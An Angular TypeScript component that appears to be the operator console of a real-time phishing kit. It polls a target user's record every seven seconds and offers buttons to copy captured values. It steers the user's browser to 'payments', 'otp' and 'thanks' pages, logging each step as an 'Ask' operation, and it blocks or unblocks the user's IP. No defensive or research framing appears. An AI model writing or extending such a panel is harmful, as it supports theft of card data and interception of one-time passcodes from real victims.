import { Component, OnInit } from '@angular/core';
import { ActivatedRoute } from '@angular/router';
import { AppService } from '../app.service';
import { faClipboard } from '@fortawesome/free-solid-svg-icons';
import { Clipboard } from '@angular/cdk/clipboard';

@Component({
  selector: 'app-opanel',
  templateUrl: './opanel.component.html',
  styleUrls: ['./opanel.component.css']
})
export class OpanelComponent implements OnInit {
  faClipB=faClipboard;
  userId: string;
  user:any;

  constructor(private route: ActivatedRoute,private appService:AppService,private clipboard: Clipboard) {
    this.route.params.subscribe(params => {
      this.userId = params['id']; // Access the 'id' parameter from the route
    });
  }

  ngOnInit(): void {
 this.getUser();
 setInterval(() => {
  this.getUser();
}, 7000);
  }

  getUser(){
    this.appService.getUserById(this.userId)
    .subscribe(response => {
 

     this.user=response;
    }
    );

  }

  copyToClipboard(text: string) {
    this.clipboard.copy(text);
    console.log(text);
}


setRedirect(redirect){
  console.log(redirect);
  var logs={};
  if(redirect=="home"){
    logs = { text: "Operation `Ask home` added successfully", date: new Date }

  }else if(redirect=="payments"){
    logs = { text: "Operation `Ask page2(payments)` added successfully", date: new Date }

  }else if(redirect=="otp/false"){
    logs = { text: "Operation `Ask Otp(false)` added successfully", date: new Date }

  }else if(redirect=="otp/true"){
    logs = { text: "Operation `Ask Otp(true)` added successfully", date: new Date }

  }else if(redirect=="thanks"){
    logs = { text: "Operation `Ask thanks` added successfully", date: new Date }

  }

  
  this.appService.updateRedirectAdmin(this.user.id,redirect,logs)
  .subscribe(response => {


   this.user=response;
    this.getUser();
  }
  );


}




checkBlocked(blocked,userId,ip){
  if(blocked==false){
    this.appService.addBlocked(ip,userId)
    .subscribe(response => {
  
   this.getUser();
    }
    );
  }else{
    this.appService.deleteBlocked(ip,userId)
    .subscribe(response => {
  
   this.getUser();
    }
    );
  }



}


}
